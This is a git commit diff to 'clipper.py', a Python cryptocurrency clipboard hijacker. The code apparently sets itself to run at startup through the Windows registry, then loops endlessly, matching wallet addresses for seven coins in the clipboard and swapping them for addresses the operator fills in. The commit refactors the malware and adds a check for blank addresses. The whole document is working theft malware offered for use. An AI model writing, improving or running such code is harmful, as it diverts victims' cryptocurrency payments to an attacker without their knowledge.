d992794d0f1a5615c9ebddc8aa3a53669bf7848f
JuicyChann <nik.xeiladakis@gmail.com>
2023-07-23 14:08:42 +0300

    more efficient code, check for blank addresses

--- clipper.py
+++ clipper.py
@@ -3,13 +3,16 @@ import re
 import winreg
 import os
 
-BTC_address = "btc address here"
-ETH_address = "eth address here"
-DOGE_address = "doge address here"
-LTC_address = "ltc address here"
-XMR_address = "xmr address here"
-BCH_address = "bch address here"
-DASH_address = "dash address here"
+# leave addresses blank if you don't want to replace them
+addresses = {
+    'BTC': '',
+    'ETH': '',
+    'DOGE': '',
+    'LTC': '',
+    'XMR': '',
+    'BCH': '',
+    'DASH': ''
+}
 
 def startup():
     get_file_name = os.path.basename(__file__)
@@ -24,7 +27,7 @@ startup()
 
 def match():
     clipboard = str(pyperclip.paste())
-    btc_match_1 = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", clipboard)
+    btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
     btc_match_2 = re.match("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
     eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
     doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
@@ -33,20 +36,11 @@ def match():
     bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
     dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
 
-    if btc_match_1 or btc_match_2:
-        pyperclip.copy(BTC_address)
-    elif eth_match:
-        pyperclip.copy(ETH_address)
-    elif doge_match:
-        pyperclip.copy(DOGE_address)
-    elif  ltc_match:
-        pyperclip.copy(LTC_address)
-    elif xmr_match:
-        pyperclip.copy(XMR_address)
-    elif bch_match:
-        pyperclip.copy(BCH_address)
-    elif dash_match:
-        pyperclip.copy(DASH_address)
+    for currency, address in addresses.items():
+        if eval(f'{currency.lower()}_match'):
+            if address:
+                pyperclip.copy(address)
+            break
 
 while True:
     match()
